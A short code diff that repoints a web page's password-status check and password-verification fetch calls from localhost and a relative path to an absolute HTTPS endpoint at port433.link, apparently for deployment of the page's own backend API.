@@ -157,7 +157,7 @@
     <script defer type="text/javascript">
       // Check the password status on page load
       document.addEventListener("DOMContentLoaded", function () {
-          fetch('http://127.0.0.1:8000/api/check-password-status/')
+          fetch('https://port433.link/api/check-password-status/')
               .then(response => response.json())
               .then(data => {
                   if (data.result === true) {
@@ -186,7 +186,7 @@
           let enteredValue = inputField.value;
     
           // API call to verify the value
-          fetch('/api/check-password/', {
+          fetch('https://port433.link/api/check-password/', {
               method: 'POST',
               headers: {
                   'Content-Type': 'application/json'
